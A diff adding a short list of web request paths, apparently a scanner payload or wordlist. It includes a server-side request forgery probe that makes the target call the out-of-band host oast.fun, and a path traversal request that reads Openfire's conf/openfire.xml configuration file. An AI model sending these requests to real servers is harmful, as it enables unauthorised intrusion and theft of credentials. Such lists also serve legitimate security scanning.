@@ -1,0 +1,4 @@
+/getFavicon?host=oast.fun?
+
+/login.jsp
+/plugins/search/..\..\..\conf\openfire.xml
